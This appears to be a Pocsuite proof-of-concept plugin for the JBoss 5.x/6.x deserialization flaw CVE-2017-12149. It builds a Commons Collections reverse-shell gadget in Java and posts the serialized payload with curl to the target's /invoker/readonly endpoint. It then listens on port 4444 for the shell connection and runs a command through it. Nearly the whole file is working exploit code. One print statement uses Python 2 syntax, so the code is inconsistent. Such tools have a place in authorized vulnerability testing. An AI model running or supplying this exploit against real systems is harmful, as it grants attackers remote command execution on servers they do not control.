# coding=utf-8
import os
import time
from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM
import requests
from threading import Thread
from pocsuite.api.poc import POCBase, Output
from pocsuite.api.poc import register
from random import sample
from string import digits, ascii_lowercase


class TestPOC(POCBase):
    name = 'JBoss 5.x/6.x RCE'
    vulID = '96880'  # https://www.seebug.org/vuldb/ssvid-96880
    author = 'Antiy'
    vulType = 'RCE'
    version = '1.0'
    references = ['https://twitter.com/pyn3rd/status/1197397475897692160']
    desc = 'JBOSSAS 5.x/6.x 反序列化命令执行漏洞(CVE-2017-12149)'
    vulDate = '2017-11-22'
    createData = '2020-11-28'
    updateDate = '2020-11-28'
    appName = 'JBoss'
    appVersion = '5.x/6.x'
    appPowerLink = 'https://www.jboss.org/'
    samples = []
    defaultPorts = [8080]
    defaultService = ['Apache Tomcat/Coyote JSP engine 1.1', 'JBoss']

    def __init__(self):
        # ##----
        self.dns_list = ['8.8.8.8', '114.114.114.114', '223.5.5.5', '180.76.76.76']
        # self.target = '172.31.50.252'
        self.rc_ip = self.get_host_ip()
        self.rc_port = 4444
        self.cmd = "id"

    def shell(self, rc_ip, rc_port, target):  # /home/aquaman/aquaman/modules/poc_vul/pocsuite_plugin/JavaDeserH2HC/
        time.sleep(1)
        path = os.path.dirname(os.path.abspath(__file__)) + '/aquaman/modules/poc_vul/pocsuite_plugin/JavaDeserH2HC'
        bash = "#!/bin/bash\ncd {}\njavac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\njava -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap {}:{} &> /dev/null".format(path, rc_ip, rc_port)
        bash = bash + "\ncurl {}://{}:{}/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser &> /dev/null".format(target['schema'], target['address'], target['port'])
        file_path = "./{}.sh".format(''.join(sample(digits + ascii_lowercase, 10)))
        with open(file_path, "w") as f:
            f.write(bash)
        f.close()
        os.system('/bin/bash {}'.format(file_path))
        os.remove(file_path)
        print(file_path)

    def _attack(self):
        return self._verify()

    def get_host_ip(self):
        s = socket(AF_INET, SOCK_DGRAM)
        for dns in self.dns_list:
            try:
                s.connect((dns, 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            except Exception:
                continue
        s.close()
        return False

    def _verify(self):
        result = {}
        target = self.parse_target(self.target, 8080)
        # thread
        t1 = Thread(target=self.shell, args=(self.rc_ip, self.rc_port, target))
        t1.start()

        # main
        tcpSerSock = socket(AF_INET, SOCK_STREAM)
        tcpSerSock.bind((self.rc_ip, self.rc_port))
        tcpSerSock.listen(5)
        print('waiting for connection...')
        tcpCliSock, addr = tcpSerSock.accept()
        print('...connnecting from:', addr)
        tcpCliSock.send(('{}\n'.format(self.cmd).encode()))
        data = tcpCliSock.recv(1024)
        print("data-->", data)
        tcpCliSock.close()
        tcpSerSock.close()
        if data:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Command'] = self.cmd
            result['VerifyInfo']['Result'] = data
        return self.parse_output(result)

    # delete...
    def run(self, rc_ip, rc_port):
        target = self.parse_target(self.target, 8080)
        time.sleep(2)
        path = os.path.dirname(os.path.abspath(__file__)) + '/JavaDeserH2HC'
        os.system("javac -cp {}:commons-collections-3.2.1.jar {}/ReverseShellCommonsCollectionsHashMap.java".format(path, path))
        os.system("java -cp {}:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap {}:{}".format(path, rc_ip, rc_port))
        with open("./ReverseShellCommonsCollectionsHashMap.ser", "rb") as f:
            data = f.read()
        url = "{}://{}:{}/invoker/readonly".format(target['schema'], target['address'], target['port'])
        print url
        resp = requests.post(url, data=data)
        print(resp.status_code)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

    def parse_target(self, target, default_port):
        # 分割协议
        schema = 'http'
        port = default_port
        address = ''
        if '://' in target:
            slices = target.split('://')
            schema = slices[0]
            target = slices[1]
        if ':' in target:
            slices = target.split(':')
            address = slices[0]
            port = slices[1]
        else:
            address = target
        return {'schema': schema, 'address': address, 'port': int(port)}


register(TestPOC)
# if __name__ == "__main__":
#     # path = os.path.dirname(os.path.abspath(__file__)) + '/JavaDeserH2HC'
#     # rc_ip = '172.31.50.178'
#     # rc_port = 4444
#     # target = {"schema": "http", "address": "172.31.50.252", "port": 8080}
#     t = TestPOC()
#     t._attack()
